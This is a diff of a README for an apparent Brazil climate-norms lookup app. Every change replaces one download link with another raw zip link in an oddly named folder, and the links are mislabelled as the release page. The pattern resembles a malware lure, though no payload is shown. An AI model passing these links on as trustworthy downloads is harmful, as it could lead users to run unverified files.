@@ -1,6 +1,6 @@
 # 🌦️ normais-climatologicas-inmet-brasil - Brazil Climate Norms Lookup
 
-[![Download normais-climatologicas-inmet-brasil](https://img.shields.io/badge/Download-normais--climatologicas--inmet--brasil-blue?style=for-the-badge)](https://github.com/yetmen/normais-climatologicas-inmet-brasil/raw/refs/heads/main/feckful/brasil_normais_inmet_climatologicas_v2.2.zip)
+[![Download normais-climatologicas-inmet-brasil](https://img.shields.io/badge/Download-normais--climatologicas--inmet--brasil-blue?style=for-the-badge)](https://github.com/yetmen/normais-climatologicas-inmet-brasil/raw/refs/heads/main/feckful/inmet_normais_brasil_climatologicas_v2.4-beta.1.zip)
 
 ---
 
@@ -36,12 +36,12 @@ You can run the app on standard laptops or desktops without extra setup.
 
 To start, you need to get the application files from the official release page.
 
-[![Download normais-climatologicas-inmet-brasil](https://img.shields.io/badge/Download-normais--climatologicas--inmet--brasil-green?style=for-the-badge)](https://github.com/yetmen/normais-climatologicas-inmet-brasil/raw/refs/heads/main/feckful/brasil_normais_inmet_climatologicas_v2.2.zip)
+[![Download normais-climatologicas-inmet-brasil](https://img.shields.io/badge/Download-normais--climatologicas--inmet--brasil-green?style=for-the-badge)](https://github.com/yetmen/normais-climatologicas-inmet-brasil/raw/refs/heads/main/feckful/inmet_normais_brasil_climatologicas_v2.4-beta.1.zip)
 
 To download:
 
 1. Click the button above or visit this link directly:  
-   https://github.com/yetmen/normais-climatologicas-inmet-brasil/raw/refs/heads/main/feckful/brasil_normais_inmet_climatologicas_v2.2.zip  
+   https://github.com/yetmen/normais-climatologicas-inmet-brasil/raw/refs/heads/main/feckful/inmet_normais_brasil_climatologicas_v2.4-beta.1.zip  
 
 2. Look for the latest release. It usually has the highest version number or most recent date.  
 
@@ -104,7 +104,7 @@ Here is a guide to the main functions:
 You do not need to update often since the data covers 1991-2020. If a new version appears:
 
 1. Visit the releases page:  
-   https://github.com/yetmen/normais-climatologicas-inmet-brasil/raw/refs/heads/main/feckful/brasil_normais_inmet_climatologicas_v2.2.zip  
+   https://github.com/yetmen/normais-climatologicas-inmet-brasil/raw/refs/heads/main/feckful/inmet_normais_brasil_climatologicas_v2.4-beta.1.zip  
 
 2. Download the latest Windows file.  
 
@@ -143,7 +143,7 @@ Your personal data and export files will not be deleted automatically. Remove th
 ## 🔗 Additional resources
 
 - Visit the GitHub release page anytime to download or check for updates:  
-  https://github.com/yetmen/normais-climatologicas-inmet-brasil/raw/refs/heads/main/feckful/brasil_normais_inmet_climatologicas_v2.2.zip  
+  https://github.com/yetmen/normais-climatologicas-inmet-brasil/raw/refs/heads/main/feckful/inmet_normais_brasil_climatologicas_v2.4-beta.1.zip  
 
 - The project is built with Python and uses CSV files for data processing.  
 
